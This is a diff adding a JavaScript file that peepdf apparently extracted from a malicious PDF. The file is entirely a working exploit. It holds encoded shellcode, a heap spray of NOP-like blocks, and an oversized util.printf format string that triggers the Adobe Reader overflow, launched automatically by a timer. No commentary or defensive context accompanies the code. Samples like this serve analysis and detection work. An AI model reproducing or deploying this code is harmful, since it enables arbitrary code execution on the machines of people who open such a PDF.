@@ -1,0 +1,25 @@
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+function t2() {
+
+    var testc = unescape("%u4141%u4141%u616a%ud959%ud9ee%u2474%u5bf4%u7381%u3213%u6fc8%u8317%ufceb%uf4e2%ud8d9%u5d35%u0101%uae09%uc90e%u23ef%u5138%ued8d%ucdd9%ufc87%u37cd%u6790%u517e%u8ef6%u35f1%ube57%u51ab%u05f6%u5deb%ufe7d%ufcb7%uce7d%udaa3%u052e%u6dd8%ufa7d%u29b5%u7df5%u2f20%u8dd6%uda50%u9ab8%ubc98%ud9a0%udafa%u8dc9%uda50%ue404%u08a5%u2805%u59df%ud1af%u9628%ucbf2%ub849%ud1af%udaf5%u053b%u75ed%u4df5%ub07a%u4ff5%u9898%u0590%udaa3%u92b0%u92a8%u6f37%u52a9%u0537%u52ab%u0535%uda51%u0d01%u5f6d%u5e7d%u55c1%u66af%u51fb%u8ef6%u9728%udcfb%uaefd%u72a1%udaf1%ue42e%u08aa%ub31e%u51ab%u0df6%u426d%uc8a0%u6f2b%ufb76%ud151%u0ec0%ud2f5%uae1a%u8d20%uae9c%uaef8%u62a1%u556c%ud2f5%u7fca%u4993%u52ef%uf6f2%u51ce%ubdf6%u016b%udda6%u01fd%ud909%uda57%ude2a%uaef8%u7ea1%uaefb%u7aa1%u9198%u0b5a%u246b%udf0f%u07f9%u71a5%u0b79%u25af%ubf49%u4ec5%ub968%u71d0%uae54%uebb1%u01df%ue184%u10c8%uea92%u34d9%ufd85%u16ab%ufa93%u28f8%ufa85%u3cce%ue7b2%u34d9%ufa95%u23c4%ucf8f%u06ab%ue09f%u29ee%ued93%u14ab%ue78e%u05df%ufc9e%u30ce%u8e92%u3ee7%uea97%u38e7%ufc94%u23ca%ucf8f%u24ab%ue284%u3ec6%u8e98%u03fe%ucaba%u26c4%ue298%u30c4%uda92%u17c4%ue29f%u10ce%u7ff6%ubc46%u2d1f%ue71d%u6715%ubc5b%u6741%ue75e%u7e09%uad5e%u381c%ua548%u7440%uab53%u7207%u971d%u6319%u975b%u790c%ue754%u7e09%uad5e%u6741%ub85a%u17ef");
+    var bg = unescape("%u0A0A%u0A0A");
+    var hdr = 20;
+    var SLK = hdr + testc.length;
+    while (bg.length < SLK) bg += bg;
+    var flb = bg.substring(0, SLK);
+    var block = bg.substring(0, bg.length - SLK);
+    while (block.length + SLK < 0xD0000) block = block + block + flb;
+    var mmm = new Array();
+    for (i = 0; i < 350; i++) {
+        mmm[i] = block + testc
+    }
+
+    test2 = "%25%32%31%34%37%34%38%33%36%34%37%2E%32%31%34%37%34%38%33%36%34%37%66";
+    test2 = unescape(test2);
+    util.printf(test2, 0);
+
+}
+
+var shaft = app.setTimeOut("t2()", 1200);
+
